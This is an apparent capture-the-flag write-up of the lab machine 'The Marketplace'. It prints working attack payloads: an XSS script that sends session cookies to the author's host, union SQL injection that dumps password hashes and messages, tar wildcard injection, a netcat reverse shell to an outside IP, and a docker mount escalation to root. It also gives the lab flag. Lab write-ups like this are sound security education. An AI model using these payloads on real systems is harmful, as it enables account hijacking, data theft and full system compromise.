# The Marketplace

## Recon

### Port Scan

`nmap -sC -sV -A -oN nmap.txt 10.10.116.104`

![Untitled](images/Untitled.png)

## Web content

### The Marketplace

By listing, found a cookie token, when i put on cyber chef to decode it i could see a JWT token

![Untitled](images/Untitled%201.png)

Token: ‘`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjczNzk2MjI3fQ.QUdHr_FrZmMTkyco74Cia9_ksfW6mmzfYTWnT7tQ5OU`’

![Untitled](images/Untitled%202.png)

By decoding the cookie we can manipulate the token and where it says admin false we can try to put admin true, it didn’t work..

On the listing field we can do XSS, so we used this payload ‘ `<script>fetch("http://10.9.11.107:8000/"+document.cookie)</script>` ’ to connect to my python tunnel

![Untitled](images/Untitled%203.png)

When it connected we got our token (test account) and the second is the admin’s token because we clicked on Report listening to admins

![Untitled](images/Untitled%204.png)

Admin’s token = ‘`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NzM3OTkyOTF9.31esCl2qfzIBP3ok0Ri9PXQtAP4c66dagyqQWUNP6hE`’

Swaped tokens on Burp and we could gain access to admin’s painel

![Untitled](images/Untitled%205.png)

### First flag

![Untitled](images/Untitled%206.png)

Usernames: system, michael, jake

After getting access to admin painel we tried some LFI and we got SQL error

![Untitled](images/Untitled%207.png)

Determine how many columns are returned, we can see that on the 5th column it shows this error so only give us 4 columns

Payload: `/admin?user=2 order by 5`

![Untitled](images/Untitled%208.png)

Columns that are reflected, only 1,2 are reflected

Payload: `/admin?user=0 union select 1,2,3,4`

![Untitled](images/Untitled%209.png)

Get database name

![Untitled](images/Untitled%2010.png)

Get tables

![Untitled](images/Untitled%2011.png)

Get columns

Payload: `http://10.10.134.33/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'`

![Untitled](images/Untitled%2012.png)

Get Hash from user michael

![Untitled](images/Untitled%2013.png)

Username: michael

Password:

Hash: `$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q`

Get Hash from user jake

![Untitled](images/Untitled%2014.png)

Username: jake

Password:

Hash: `$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG`

Cracking the hash was not successefull so we search on the database and found a table called Messages

![Untitled](images/Untitled%2015.png)

Found the ssh password using this payload:

`/admin?user=0 union select 1,group_concat(message_content),3,4 from messages`

![Untitled](images/Untitled%2016.png)

## Remote Access

`ssh jake@10.10.134.33`

![Untitled](images/Untitled%2017.png)

Found the 2nd flag ( user.txt ), `THM{c3648ee7af1369676e3e4b15da6dc0b4}`

![Untitled](images/Untitled%2018.png)

### Users

Order by permissions

jake < marketplace < michael < root

### Docker

`/home/marketplace/the-marketplace`

### Privilege escalation

Backup script running as michael with a wild card so we did wild card injection

![Untitled](images/Untitled%2019.png)

Manipulate the wild card with the following commands

`echo “” > ‘--checkpoint=1’`

`echo “” > ‘--checkpoint-action=exec=sh shell.sh’`

The code line in the background will look like this 

`tar cf /opt/backups/backup.tar --checkpoint=1 --checkpint-action=exec=sh shell.sh`

### Shell.sh

Reverse shell on the file so it runs as michael and we get vertical privilege escalation to the next user

`#!/bin/bash`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.11.107 9999 >/tmp/f`

![Untitled](images/Untitled%2020.png)

`sudo -u michael /opt/backups/backup.sh`

## Docker to root

As user michael we could user the docker to gain root, i saw the images were there and used the alpine docker image.

Found the `docker.sock` was on `/run/docker.sock` as we saw on hacktricks website

![Untitled](images/Untitled%2021.png)

![Untitled](images/Untitled%2022.png)

Then we used this payload to gain root `docker run -it -v /:/host/ alpine chroot /host/ bash`

![Untitled](images/Untitled%2023.png)
